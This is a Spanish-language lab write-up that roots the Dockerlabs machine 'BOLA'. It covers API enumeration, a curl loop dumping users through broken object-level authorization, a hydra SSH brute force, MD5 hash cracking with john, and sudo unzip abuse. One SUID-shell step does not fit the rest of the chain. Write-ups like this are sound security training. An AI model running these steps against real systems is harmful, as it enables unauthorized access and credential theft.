# BOLA

Máquina de nivel intermedio de Dockerlab. IP: `172.17.0.2`

El vector de ataque principal es una vulnerabilidad **BOLA (Broken Object Level Authorization)** en una API REST expuesta en el puerto 12345: la API devuelve los objetos de usuario simplemente variando el identificador numérico en la ruta `/user/{id}`, sin exigir autenticación ni comprobar permisos.

## 1. Reconocimiento

Escaneamos puertos y servicios con `nmap`:

```
nmap -sV -sC 172.17.0.2
```

![[Pasted image 20261001223106.png]]

Se abren dos puertos:

- **22/tcp** → OpenSSH 9.2p1 (Debian).
- **12345/tcp** → servidor HTTP Werkzeug 2.2.2 (Python 3.11.2), que responde `application/json`: es la API de la máquina.

## 2. Enumeración de la API

Atacamos el puerto web con `gobuster` y una wordlist de APIs para descubrir rutas:

```
gobuster dir -u http://172.17.0.2:12345 -w /home/kali/SecLists/Discovery/Web-Content/api/ispssystem_billmanager_api.txt
```

![[Pasted image 20261001223311.png]]

Aparece el directorio `/user`, que redirige con status 308 a `http://172.17.0.2:12345/user/`. Sobre esa ruta repetimos la enumeración con una wordlist de endpoints de API:

```
gobuster dir -u http://172.17.0.2:12345/user -w /home/kali/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt
```

![[Pasted image 20261001224832.png]]

Devuelve respuestas **200** para identificadores numéricos: `/user/01`, `/user/02`, `/user/1`, `/user/03`, `/user/10`, `/user/2`, `/user/20`, `/user/3`. Es decir, la API acepta cualquier ID y devuelve el objeto de usuario asociado sin pedir credenciales: un BOLA clásico.

## 3. Explotación del BOLA: volcado de usuarios

Para recorrer todos los IDs escribimos un script que consulta `/user/$i`, extrae el campo `username` del JSON y lo acumula en un fichero:

```bash
#!/bin/bash

for i in {1..25}; do
    curl -s -X GET "http://172.17.0.2:12345/user/$i" | grep username | cut -d\" -f4 >> usernames.txt
done;
```

Lo ejecutamos y vemos el resultado:

![[Pasted image 20261001234611.png]]

El fichero `usernames.txt` queda con 20 usuarios: alice, bob, charlie, diana, edward, fiona, george, hannah, ian, julia, kevin, laura, michael, nina, oscar, paula, quinn, rachel, steven y tina.

## 4. Acceso inicial: fuerza bruta SSH

Con la lista de usuarios en mano, probamos esa misma lista como contraseñas contra SSH con `hydra`:

```
hydra -L /home/kali/usernames.txt -P /home/kali/usernames.txt ssh://172.17.0.2 -t 4
```

![[Pasted image 20261001235656.png]]

Hydra encuentra una credencial válida: usuario `steven` con contraseña `steven`. Nos conectamos con ella.

## 5. Enumeración como steven

Dentro de la sesión revisamos el historial de comandos del usuario, que filtra bastante información:

![[Pasted image 20261002000057.png]]

El `.bash_history` de steven revela:

- Credenciales de base de datos: `mysql -u steven -psteven`.
- Un fichero llamado `secretitosecretazo.zip` que se descomprimió y se copió a `/home`.
- Un `sudo -l` previo, típico de una enumeración de privilegios.

## 6. Base de datos `secretito`

Entramos en MySQL/MariaDB con esas credenciales y enumeramos:

![[Pasted image 20261002000555.png]]

Hay dos bases de datos: `information_schema` y `secretito`. Dentro de `secretito` listamos las tablas:

![[Pasted image 20261002000629.png]]

Existe una única tabla, `usuarios`, y la volcamos completa:

![[Pasted image 20261002000820.png]]

Obtenemos cinco registros con nombres de usuario y sus contraseñas almacenadas como hashes MD5:

```
+----+--------------+----------------------------------+
| id | usuario      | password                         |
+----+--------------+----------------------------------+
|  1 | alice        | 8bdffaa69d328c1d4ae3aeadc97de223 |
|  2 | bob          | d8578edf8458ce06fbc5bb76a58c5ca4 |
|  3 | charlie      | e99a18c428cb38d5f260853678922e03 |
|  4 | (incompleta) | aa87ddc5b4c24406d26ddad771ef44b0 |
|  5 | diana        | e10adc3949ba59abbe56e057f20f883e |
+----+--------------+----------------------------------+
```

La fila 4 quedó cortada en las notas originales: solo se conserva su hash.

## 7. Escalada de privilegios

Consultamos qué usuarios con shell interactiva existen en la máquina:

```
cat /etc/passwd | grep bash
```

![[Pasted image 20261002001347.png]]

Aparecen `root`, `steven` (uid 1000) y `baluadmin` (uid 1001). Atacamos los hashes MD5 volcados con `john`:

```
john --format=raw-md5 hashe.txt
```

![[Pasted image 20261002002022.png]]

John descubre la contraseña `estrella`. Con esa credencial pasamos a la sesión de `baluadmin` y comprobamos sus permisos sudo:

```
sudo -l
```

![[Pasted image 20261002002500.png]]

`baluadmin` puede ejecutar `/usr/bin/unzip` como root sin contraseña (`(ALL) NOPASSWD: /usr/bin/unzip`). Antes de explotarlo, preparamos una shell SUID copiando `/bin/sh` a `/tmp` y marcándola con el bit SUID:

```
cp /bin/sh .
chmod +s ./sh
```

![[Pasted image 20261002004836.png]]

El binario `sh` aparece en rojo en `/tmp`, indicando el bit SUID. Por último usamos el `unzip` con sudo para abrir `secretitosecretazo.zip`, que extrae `sorpresitajiji.txt` con el formato `usuario:contraseña` de root:

![[Pasted image 20261002010403.png]]

Tras algunos intentos fallidos de `sudo root` y `su root`, la contraseña correcta nos devuelve un prompt de **root**: `root@f285d1915fdf:/tmp#`.

## 8. Resultado final

Conseguimos root en la máquina combinando el BOLA de la API (volcado de usuarios), reutilización de credenciales (steven:steven), una base de datos con hashes MD5 débiles y el abuso de `unzip` con sudo.

> Pendiente de documentar el resultado final.
